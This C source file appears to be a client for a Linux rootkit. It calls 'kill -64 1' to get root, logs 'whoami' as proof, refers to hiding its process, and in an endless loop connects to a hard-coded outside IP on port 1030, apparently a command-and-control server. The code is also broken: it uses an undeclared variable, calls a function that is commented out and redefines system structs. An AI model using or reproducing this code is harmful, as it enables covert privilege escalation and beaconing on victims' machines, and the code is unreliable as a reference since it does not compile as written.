#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>


// Structs for IPv4 AF_INET sockets:
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};

struct in_addr {
    unsigned long s_addr;          // load with inet_pton()
};

struct sockaddr {
    unsigned short    sa_family;    // address family, AF_xxx
    char              sa_data[14];  // 14 bytes of protocol address
};

/*static void test_connection(void)
{
	char cmd[] = "curl -I https://stackoverflow.com/";
    system(cmd);
}*/

int send_server(char *message)
{
	struct sockaddr_in cc2;
	
	//Create socket
	int sock = socket(AF_INET , SOCK_STREAM , 0);
		
	server.sin_addr.s_addr = inet_addr("47.88.90.66");
	server.sin_family = AF_INET;
	server.sin_port = htons( 1030 );

	//Connect to remote server
	if (connect(sock, (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		return 1;
	}
	
	//puts("Connected\n");
	
	//Send data
	if( send(sock, message , strlen(message) , 0) < 0)
	{
		return 1;
	}
	//puts("Data has been sent successfully\n");
	
    close(sock);

	return 0;
}

int get_root(void)
{
    system("kill -64 1");
    
    // prove that root was gained
    system("whoami > /home/debian/test.txt");

    // get pid to hide process
    int pid = getpid();
    printf("pid is %d\n", pid);

    return 0;
}

int main(int argc, char *argv[]) 
{

    while(1)
    {
        sleep(10);
        test_connection();
        get_root();
        send_server("GET / HTTP/1.1\r");
    }

    return 0;
}